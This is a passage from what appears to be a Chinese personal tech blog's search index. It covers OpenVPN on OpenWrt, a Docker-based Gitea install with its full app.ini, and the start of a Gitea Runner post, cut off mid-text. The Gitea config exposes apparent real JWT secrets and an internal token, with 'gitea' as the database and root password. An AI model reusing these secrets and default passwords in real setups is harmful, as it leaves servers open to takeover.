href=\"%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%BA%A7%E5%8F%8D%E9%A6%88%E7%8E%AF%E5%BD%A2%E6%8C%AF%E8%8D%A1%E5%99%A8%E7%9A%84%E7%9C%9F%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%8F%91%E7%94%9F%E5%99%A8%E8%AE%BE%E8%AE%A1.pdf\">基于多级反馈环形振荡器的真随机数发生器设计</a></li>\n<li><a href=\"%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%9C%9F%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%8F%91%E7%94%9F%E5%99%A8.pdf\">安全系统的真随机数发生器</a></li>\n<li><a href=\"%E7%9C%9F%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%8F%91%E7%94%9F%E5%99%A8%E7%9A%84%E5%90%8E%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95.pdf\">真随机数发生器的后处理方法</a></li>\n</ul>\n"},{"title":"OpenVPN + OpenWrt 的内网穿透方案","url":"/2025/01/22/OpenVPN-OpenWrt-%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%A1%88/","content":"<h2 id=\"二、Home-Client-安装\"><a href=\"#二、Home-Client-安装\" class=\"headerlink\" title=\"二、Home Client 安装\"></a>二、Home Client 安装</h2><h3 id=\"路由器-IP-地址配置\"><a href=\"#路由器-IP-地址配置\" class=\"headerlink\" title=\"路由器 IP 地址配置\"></a>路由器 IP 地址配置</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">uci <span class=\"built_in\">set</span> network.lan.proto=<span class=\"string\">&#x27;static&#x27;</span></span><br><span class=\"line\">uci <span class=\"built_in\">set</span> network.lan.ipaddr=<span class=\"string\">&#x27;192.168.73.3&#x27;</span></span><br><span class=\"line\">uci <span class=\"built_in\">set</span> network.lan.netmask=<span class=\"string\">&#x27;255.255.255.0&#x27;</span></span><br><span class=\"line\">uci <span class=\"built_in\">set</span> network.lan.gateway=<span class=\"string\">&#x27;192.168.73.1&#x27;</span></span><br><span class=\"line\">uci <span class=\"built_in\">set</span> network.lan.dns=<span class=\"string\">&#x27;192.168.73.1&#x27;</span></span><br><span class=\"line\">uci commit network</span><br><span class=\"line\">service network restart</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"路由器-Firewall-放通\"><a href=\"#路由器-Firewall-放通\" class=\"headerlink\" title=\"路由器 Firewall 放通\"></a>路由器 Firewall 放通</h3><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">config zone</span><br><span class=\"line\">    option name &#x27;wan&#x27;</span><br><span class=\"line\">    option input &#x27;REJECT&#x27;</span><br><span class=\"line\">    option output &#x27;ACCEPT&#x27;</span><br><span class=\"line\">    option forward &#x27;REJECT&#x27;</span><br><span class=\"line\">    option masq &#x27;1&#x27;</span><br><span class=\"line\">    option mtu_fix &#x27;1&#x27;</span><br><span class=\"line\">    list device &#x27;tun0&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">config forwarding</span><br><span class=\"line\">    option src &#x27;lan&#x27;</span><br><span class=\"line\">    option dest &#x27;wan&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">config forwarding</span><br><span class=\"line\">    option src &#x27;wan&#x27;</span><br><span class=\"line\">    option dest &#x27;lan&#x27;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"MacOS-清理-DNS-缓存的命令\"><a href=\"#MacOS-清理-DNS-缓存的命令\" class=\"headerlink\" title=\"MacOS 清理 DNS 缓存的命令\"></a>MacOS 清理 DNS 缓存的命令</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo killall -HUP mDNSResponder</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://openwrt.org/zh/docs/guide-user/services/vpn/openvpn/basic\">如何在OpenWrt上配置运行OpenVPN服务器</a><br><a href=\"https://openwrt.org/docs/guide-user/services/vpn/openvpn/extras\">OpenWrt：关于 OpenVPN 扩展的说明</a><br><a href=\"http://www.edulinks.cn/2020/05/19/20200519-macos-route/\">Mac OS路由设置常用命令</a><br><a href=\"https://www.cnblogs.com/f-ck-need-u/p/7064286.html\">抓包工具tcpdump用法说明</a></p>\n"},{"title":"Gitea 安装记录","url":"/2025/03/02/Gitea-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>Gitlab 是私有软件仓库的标准解决方案，但是国内只能使用所谓的“极狐版”，因此想找一个替代方案，意外发现了 Gitea。作为一款优秀的开源软件，Gitea 功能简洁，资源消耗少（2G内存即可，树莓派都可运行），不过由于是个人开发者，版本更新比较慢，但也足够使用了。<br>官方主页：<a href=\"https://docs.gitea.com/\">https://docs.gitea.com/</a><br>中文主页：<a href=\"https://docs.gitea.cn/\">https://docs.gitea.cn/</a></p>\n<p>当前最新版本是 1.23.1，二进制代码的下载页面是：<a href=\"https://dl.gitea.com/gitea/1.23.1/\">https://dl.gitea.com/gitea/1.23.1/</a><br>docker 是更好的安装方式，在软件安装目录编辑如下<code>/opt/gitea/docker-compose.yml</code> 文件即可。</p>\n<p>可以发现部署了两个容器：主应用 <code>gitea/gitea:1.23.1</code> 和后端数据库 <code>mysql:8</code>。<br>安装目录位于：<code>/opt/gitea</code>，包含两个子目录，分别用于 gitea 和 mysql 容器。</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&quot;3&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">networks:</span></span><br><span class=\"line\">  <span class=\"attr\">gitea:</span></span><br><span class=\"line\">    <span class=\"attr\">external:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\">  <span class=\"attr\">server:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">docker.io/gitea/gitea:1.23.1</span></span><br><span class=\"line\">    <span class=\"attr\">container_name:</span> <span class=\"string\">gitea</span></span><br><span class=\"line\">    <span class=\"attr\">environment:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">USER_UID=1000</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">USER_GID=1000</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">GITEA__database__DB_TYPE=mysql</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">GITEA__database__HOST=db:3306</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">GITEA__database__NAME=gitea</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">GITEA__database__USER=gitea</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">GITEA__database__PASSWD=gitea</span></span><br><span class=\"line\">    <span class=\"attr\">restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\">    <span class=\"attr\">networks:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">gitea</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./gitea:/data</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/etc/timezone:/etc/timezone:ro</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/etc/localtime:/etc/localtime:ro</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;80:3000&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;222:22&quot;</span></span><br><span class=\"line\">    <span class=\"attr\">depends_on:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">db</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">db:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">docker.io/library/mysql:8</span></span><br><span class=\"line\">    <span class=\"attr\">restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\">    <span class=\"attr\">environment:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">MYSQL_ROOT_PASSWORD=gitea</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">MYSQL_USER=gitea</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">MYSQL_PASSWORD=gitea</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">MYSQL_DATABASE=gitea</span></span><br><span class=\"line\">    <span class=\"attr\">networks:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">gitea</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./mysql:/var/lib/mysql</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>为了避免 GW 问题，实际安装是通过 Harbor-proxy 下载，再修改 tag 提供给 docker</p>\n</blockquote>\n<h2 id=\"二、配置文件\"><a href=\"#二、配置文件\" class=\"headerlink\" title=\"二、配置文件\"></a>二、配置文件</h2><p>Gitea 启动成功后，自动生成配置文件 <code>/opt/gitea/gitea/gitea/conf/app.ini</code>。<br>参数说明：<a href=\"https://docs.gitea.cn/administration/config-cheat-sheet\">https://docs.gitea.cn/administration/config-cheat-sheet</a><br>可以停止 docker 服务后，根据需要手工修改配置，然后重启 docker 服务生效。</p>\n<ul>\n<li>Git 提供 HTTP 协议，默认容器端口 3000，对应主机端口 80</li>\n<li>Git 提供 SSH 协议，容器端口 22，主机端口 222（为了避开主机自己使用的 SSH 端口）</li>\n<li>HTTPS 可以成功配置，但后续 git 很难处理自签名证书，因此放弃了</li>\n<li>LFS 用于存储大对象文件，例如图片、视频等二进制文件</li>\n</ul>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">PROTOCOL</span> <span class=\"string\">=</span> <span class=\"string\">http</span></span><br><span class=\"line\"><span class=\"string\">ROOT_URL</span> <span class=\"string\">=</span> <span class=\"string\">http://gitea.lan</span></span><br><span class=\"line\"><span class=\"string\">HTTP_PORT</span> <span class=\"string\">=</span> <span class=\"number\">3000</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">DISABLE_SSH</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"string\">SSH_PORT</span> <span class=\"string\">=</span> <span class=\"number\">22</span></span><br><span class=\"line\"><span class=\"string\">SSH_LISTEN_PORT</span> <span class=\"string\">=</span> <span class=\"number\">22</span></span><br><span class=\"line\"><span class=\"string\">LFS_START_SERVER</span> <span class=\"string\">=</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"string\">LFS_JWT_SECRET</span> <span class=\"string\">=</span> <span class=\"string\">N_DStu6KTGmYUNGA0O9K1ULA7hdTHK6vVEOlymvZeGE</span></span><br><span class=\"line\"><span class=\"string\">OFFLINE_MODE</span> <span class=\"string\">=</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、设置系统服务\"><a href=\"#三、设置系统服务\" class=\"headerlink\" title=\"三、设置系统服务\"></a>三、设置系统服务</h2><p>编辑服务文件： <code>/etc/systemd/system/gitea.service</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Harbor</span><br><span class=\"line\">After=docker.service systemd-networkd.service systemd-resolved.service</span><br><span class=\"line\">Requires=docker.service</span><br><span class=\"line\">Documentation=http://github.com/gitea/gitea</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\">Restart=on-failure</span><br><span class=\"line\">RestartSec=5</span><br><span class=\"line\">ExecStartPre=/usr/bin/docker-compose -f /opt/gitea/docker-compose.yml down</span><br><span class=\"line\">ExecStart=/usr/bin/docker-compose -f /opt/gitea/docker-compose.yml up</span><br><span class=\"line\">ExecStop=/usr/bin/docker-compose -f /opt/gitea/docker-compose.yml down</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<p>设置系统自启动</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"built_in\">enable</span> --now gitea</span><br><span class=\"line\">systemctl gitea status</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、Gitea-使用\"><a href=\"#四、Gitea-使用\" class=\"headerlink\" title=\"四、Gitea 使用\"></a>四、Gitea 使用</h2><p>访问方式： <a href=\"http://gitea.lan/\">http://gitea.lan</a>, 主机对外暴露 http 协议 80 端口。<br>注意！ssh 访问的端口是 222，而非标准的 22，因为 Gitea 实例运行在容器镜像，而非 host 操作系统。</p>\n<p>Gitea 系统启动需要一段时间，可以跟踪容器日志查看，出现 http 侦听信息就说明启动成功。<br><img src=\"/2025/03/02/Gitea-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/gitea.png\" alt=\"gitea\"><br>第一次登陆需要注册 admin，以后就可以正常管理代码库了。</p>\n<hr>\n<h2 id=\"附录一：目录结构\"><a href=\"#附录一：目录结构\" class=\"headerlink\" title=\"附录一：目录结构\"></a>附录一：目录结构</h2><p><code>/opt/gitea/mysql</code> 是 Mysql 容器的数据目录，就不讨论了。<br><code>/opt/gitea/gitea</code> 是 Gitea 容器的数据目录，下面三个子目录分别用于 git、ssh 和 用户代码库。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">/opt/gitea/gitea</span><br><span class=\"line\">├── git</span><br><span class=\"line\">│   ├── lfs</span><br><span class=\"line\">│   └── repositories</span><br><span class=\"line\">├── gitea</span><br><span class=\"line\">│   ├── actions_artifacts</span><br><span class=\"line\">│   ├── actions_log</span><br><span class=\"line\">│   ├── attachments</span><br><span class=\"line\">│   ├── avatars</span><br><span class=\"line\">│   ├── conf</span><br><span class=\"line\">│   ├── home</span><br><span class=\"line\">│   ├── indexers</span><br><span class=\"line\">│   ├── jwt</span><br><span class=\"line\">│   ├── log</span><br><span class=\"line\">│   ├── packages</span><br><span class=\"line\">│   ├── queues</span><br><span class=\"line\">│   ├── repo-archive</span><br><span class=\"line\">│   ├── repo-avatars</span><br><span class=\"line\">│   ├── sessions</span><br><span class=\"line\">│   └── tmp</span><br><span class=\"line\">└── ssh</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"附录二：INI-全量配置文件\"><a href=\"#附录二：INI-全量配置文件\" class=\"headerlink\" title=\"附录二：INI 全量配置文件\"></a>附录二：INI 全量配置文件</h2><p>配置文件位于：<code>$Gitea/gitea/conf/app.ini</code></p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">APP_NAME</span> <span class=\"string\">=</span> <span class=\"attr\">Gitea:</span> <span class=\"string\">Git</span> <span class=\"string\">with</span> <span class=\"string\">a</span> <span class=\"string\">cup</span> <span class=\"string\">of</span> <span class=\"string\">tea</span></span><br><span class=\"line\"><span class=\"string\">RUN_MODE</span> <span class=\"string\">=</span> <span class=\"string\">prod</span></span><br><span class=\"line\"><span class=\"string\">RUN_USER</span> <span class=\"string\">=</span> <span class=\"string\">git</span></span><br><span class=\"line\"><span class=\"string\">WORK_PATH</span> <span class=\"string\">=</span> <span class=\"string\">/data/gitea</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">repository</span>]</span><br><span class=\"line\"><span class=\"string\">ROOT</span> <span class=\"string\">=</span> <span class=\"string\">/data/git/repositories</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">repository.local</span>]</span><br><span class=\"line\"><span class=\"string\">LOCAL_COPY_PATH</span> <span class=\"string\">=</span> <span class=\"string\">/data/gitea/tmp/local-repo</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">repository.upload</span>]</span><br><span class=\"line\"><span class=\"string\">TEMP_PATH</span> <span class=\"string\">=</span> <span class=\"string\">/data/gitea/uploads</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">server</span>]</span><br><span class=\"line\"><span class=\"string\">APP_DATA_PATH</span> <span class=\"string\">=</span> <span class=\"string\">/data/gitea</span></span><br><span class=\"line\"><span class=\"string\">DOMAIN</span> <span class=\"string\">=</span> <span class=\"string\">gitea.lan</span></span><br><span class=\"line\"><span class=\"string\">SSH_DOMAIN</span> <span class=\"string\">=</span> <span class=\"string\">gitea.lan</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">PROTOCOL</span> <span class=\"string\">=</span> <span class=\"string\">http</span></span><br><span class=\"line\"><span class=\"string\">ROOT_URL</span> <span class=\"string\">=</span> <span class=\"string\">http://gitea.lan</span></span><br><span class=\"line\"><span class=\"string\">HTTP_PORT</span> <span class=\"string\">=</span> <span class=\"number\">3000</span> </span><br><span class=\"line\"><span class=\"comment\"># CERT_FILE = ../cert.pem</span></span><br><span class=\"line\"><span class=\"comment\"># KEY_FILE = ../key.pem</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># config http transportfailled!</span></span><br><span class=\"line\"><span class=\"comment\"># REDIRECT_TO_OTHER_PORT = true</span></span><br><span class=\"line\"><span class=\"comment\"># PORT_TOREDIRECT = 3080</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">DISABLE_SSH</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"string\">SSH_PORT</span> <span class=\"string\">=</span> <span class=\"number\">22</span></span><br><span class=\"line\"><span class=\"string\">SSH_LISTEN_PORT</span> <span class=\"string\">=</span> <span class=\"number\">22</span></span><br><span class=\"line\"><span class=\"string\">LFS_START_SERVER</span> <span class=\"string\">=</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"string\">LFS_JWT_SECRET</span> <span class=\"string\">=</span> <span class=\"string\">N_DStu6KTGmYUNGA0O9K1ULA7hdTHK6vVEOlymvZeGE</span></span><br><span class=\"line\"><span class=\"string\">OFFLINE_MODE</span> <span class=\"string\">=</span> <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">database</span>]</span><br><span class=\"line\"><span class=\"string\">PATH</span> <span class=\"string\">=</span> <span class=\"string\">/data/gitea/gitea.db</span></span><br><span class=\"line\"><span class=\"string\">DB_TYPE</span> <span class=\"string\">=</span> <span class=\"string\">mysql</span></span><br><span class=\"line\"><span class=\"string\">HOST</span> <span class=\"string\">=</span> <span class=\"string\">db:3306</span></span><br><span class=\"line\"><span class=\"string\">NAME</span> <span class=\"string\">=</span> <span class=\"string\">gitea</span></span><br><span class=\"line\"><span class=\"string\">USER</span> <span class=\"string\">=</span> <span class=\"string\">gitea</span></span><br><span class=\"line\"><span class=\"string\">PASSWD</span> <span class=\"string\">=</span> <span class=\"string\">gitea</span></span><br><span class=\"line\"><span class=\"string\">LOG_SQL</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"string\">SCHEMA</span> <span class=\"string\">=</span> </span><br><span class=\"line\"><span class=\"string\">SSL_MODE</span> <span class=\"string\">=</span> <span class=\"string\">disable</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">indexer</span>]</span><br><span class=\"line\"><span class=\"string\">ISSUE_INDEXER_PATH</span> <span class=\"string\">=</span> <span class=\"string\">/data/gitea/indexers/issues.bleve</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">session</span>]</span><br><span class=\"line\"><span class=\"string\">PROVIDER_CONFIG</span> <span class=\"string\">=</span> <span class=\"string\">/data/gitea/sessions</span></span><br><span class=\"line\"><span class=\"string\">PROVIDER</span> <span class=\"string\">=</span> <span class=\"string\">file</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">picture</span>]</span><br><span class=\"line\"><span class=\"string\">AVATAR_UPLOAD_PATH</span> <span class=\"string\">=</span> <span class=\"string\">/data/gitea/avatars</span></span><br><span class=\"line\"><span class=\"string\">REPOSITORY_AVATAR_UPLOAD_PATH</span> <span class=\"string\">=</span> <span class=\"string\">/data/gitea/repo-avatars</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">attachment</span>]</span><br><span class=\"line\"><span class=\"string\">PATH</span> <span class=\"string\">=</span> <span class=\"string\">/data/gitea/attachments</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">log</span>]</span><br><span class=\"line\"><span class=\"string\">MODE</span> <span class=\"string\">=</span> <span class=\"string\">console</span></span><br><span class=\"line\"><span class=\"string\">LEVEL</span> <span class=\"string\">=</span> <span class=\"string\">info</span></span><br><span class=\"line\"><span class=\"string\">ROOT_PATH</span> <span class=\"string\">=</span> <span class=\"string\">/data/gitea/log</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">security</span>]</span><br><span class=\"line\"><span class=\"string\">INSTALL_LOCK</span> <span class=\"string\">=</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"string\">SECRET_KEY</span> <span class=\"string\">=</span> </span><br><span class=\"line\"><span class=\"string\">REVERSE_PROXY_LIMIT</span> <span class=\"string\">=</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"string\">REVERSE_PROXY_TRUSTED_PROXIES</span> <span class=\"string\">=</span> <span class=\"string\">*</span></span><br><span class=\"line\"><span class=\"string\">INTERNAL_TOKEN</span> <span class=\"string\">=</span> <span class=\"string\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3Mzg2MDA1NTJ9.rRxDlAsDJa9dNc5Kdgi-GT7HkZpnQCk4tQ0dVj6JoPc</span></span><br><span class=\"line\"><span class=\"string\">PASSWORD_HASH_ALGO</span> <span class=\"string\">=</span> <span class=\"string\">pbkdf2</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">service</span>]</span><br><span class=\"line\"><span class=\"string\">DISABLE_REGISTRATION</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"string\">REQUIRE_SIGNIN_VIEW</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"string\">REGISTER_EMAIL_CONFIRM</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"string\">ENABLE_NOTIFY_MAIL</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"string\">ALLOW_ONLY_EXTERNAL_REGISTRATION</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"string\">ENABLE_CAPTCHA</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"string\">DEFAULT_KEEP_EMAIL_PRIVATE</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"string\">DEFAULT_ALLOW_CREATE_ORGANIZATION</span> <span class=\"string\">=</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"string\">DEFAULT_ENABLE_TIMETRACKING</span> <span class=\"string\">=</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"string\">NO_REPLY_ADDRESS</span> <span class=\"string\">=</span> <span class=\"string\">noreply.localhost</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">lfs</span>]</span><br><span class=\"line\"><span class=\"string\">PATH</span> <span class=\"string\">=</span> <span class=\"string\">/data/git/lfs</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">mailer</span>]</span><br><span class=\"line\"><span class=\"string\">ENABLED</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">openid</span>]</span><br><span class=\"line\"><span class=\"string\">ENABLE_OPENID_SIGNIN</span> <span class=\"string\">=</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"string\">ENABLE_OPENID_SIGNUP</span> <span class=\"string\">=</span> <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">cron.update_checker</span>]</span><br><span class=\"line\"><span class=\"string\">ENABLED</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">repository.pull-request</span>]</span><br><span class=\"line\"><span class=\"string\">DEFAULT_MERGE_STYLE</span> <span class=\"string\">=</span> <span class=\"string\">merge</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">repository.signing</span>]</span><br><span class=\"line\"><span class=\"string\">DEFAULT_TRUST_MODEL</span> <span class=\"string\">=</span> <span class=\"string\">committer</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">oauth2</span>]</span><br><span class=\"line\"><span class=\"string\">JWT_SECRET</span> <span class=\"string\">=</span> <span class=\"string\">8m2nHq3h9dmVF9u3v5BYwJsRL3c9DN7XDLxctX20FeE</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"string\">actions</span>]</span><br><span class=\"line\"><span class=\"string\">ENABLED=true</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"官方网站\"><a href=\"#官方网站\" class=\"headerlink\" title=\"官方网站\"></a>官方网站</h2><ul>\n<li><a href=\"https://docs.gitea.cn/\">https://docs.gitea.cn/</a></li>\n<li><a href=\"https://docs.gitea.cn/installation/install-with-docker\">使用 Docker 安装 Gitea</a></li>\n</ul>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.ruanyifeng.com/blog/2019/09/getting-started-with-github-actions.html\">GitHub Actions 入门教程 - 阮一峰</a></li>\n</ul>\n"},{"title":"Gitea Runner 安装记录","url":"/2025/02/09/Gitea-Runner-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>对标 Jenkis 自动化 CI&#x2F;CD 工具，Gitlab 开发了自己的 Gitlab CI&#x2F;CD，Github 原来是和 Tranvis 合作的，后来也开发了自己的 Actions，Gitea 没有自己的 CI&#x2F;CD 工具，而是“借用”了 Actions，改了个名字就是 Gitea Actions。</p>\n<p>和其他 CI&#x2F;CD 解决方案一样，Gitea 不会自己运行 Job，而是将 Job 委托给 Runner。从安全和性能的角度考虑，Runner 通常运行在一台独立的服务器上，例如安全域边界的堡垒机。</p>\n<p>Gitea Actions 的 Runner 被称为<code>act_runner</code>，是一个用 Go 语言编写的程序。<br>源代码位于：<a href=\"https://gitea.com/gitea/act_runner\">https://gitea.com/gitea/act_runner</a>，当前最新版本是 0.2.11。</p>\n<blockquote>\n<p>act_runner 其实是 <a href=\"http://github.com/nektos/act\">nektos&#x2F;act</a> 的一个分支</p>\n</blockquote>\n<h2 id=\"二、技术架构\"><a href=\"#二、技术架构\" class=\"headerlink\" title=\"二、技术架构\"></a>二、技术架构</h2><p>GitHub Actions 有一些自己的术语。</p>\n<ul>\n<li>workflow （工作流程）：持续集成一次运行的过程，<strong>对应为一个 yaml 文件</strong></li>\n<li>job （任务）：一次持续集成的运行，包含一个或多个 jobs。<strong>对应为一个 Container 实例</strong></li>\n<li>step（步骤）：执行 job 的若干个步骤，一步步完成。类似于 Gitlab CI 的 stage</li>\n<li>action（动作）：每个 step 可以依次执行一个或多个命令（action）。可以是一条 bash 指令，也可以是一个<strong>在 Github Market 上架的脚本</strong></li>\n</ul>\n<p><img src=\"/2025/02/09/Gitea-Runner-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/runner.png\" alt=\"arch\"></p>\n<ol>\n<li>Act Runner 是一个管理者，首先使用令牌在指定的 Gitea 实例上注册，并通过声明自己的 lable 向 Gitea 报告它可以运行的 Job 类型。</li>\n<li>当触发条件满足时，Act Runner 为每个 Job 创建并运行相应的 Container；Job 容器负责逐条处理每个步骤和动作，有些 action 可能需要从 Gitea 实例获得脚本代码，例如使用了 <a href=\"http://gitea.lan/actions/checkout@v3\">http:&#x2F;&#x2F;gitea.lan&#x2F;actions&#x2F;checkout@v3</a></li>\n<li>Act Runner 运行需要加载 Job 镜像，可能位于 dockerhub 上；也可能需要从 github.com 或 gitea.com 下载脚本代码，因此可能需要访问互联网。</li>\n<li>Job 容器执行 action 脚本时，可能也需要从互联网下载资源，例如 ubunut 的软件包、npm 的软件包等，因此也可能访问互联网。</li>\n</ol>\n<p>Runner 能够连接到 Gitea 实例是必须的，互联网访问是可选的。但如果没有互联网访问，管理员需要确保所使用的 image、action 及其资源依赖都在内网中。</p>\n<h2 id=\"三、安装步骤\"><a href=\"#三、安装步骤\" class=\"headerlink\" title=\"三、安装步骤\"></a>三、安装步骤</h2><p>二进制代码下载页面：<a href=\"https://gitea.com/gitea/act_runner/releases\">https://gitea.com/gitea/act_runner&#x2F;releases</a><br>镜像地址： dockhub.com&#x2F;gitea&#x2F;act_runner:0.2.11</p>\n<h3 id=\"1-在-Gitea-注册\"><a href=\"#1-在-Gitea-注册\" class=\"headerlink\" title=\"1. 在 Gitea 注册\"></a>1. 在 Gitea 注册</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span 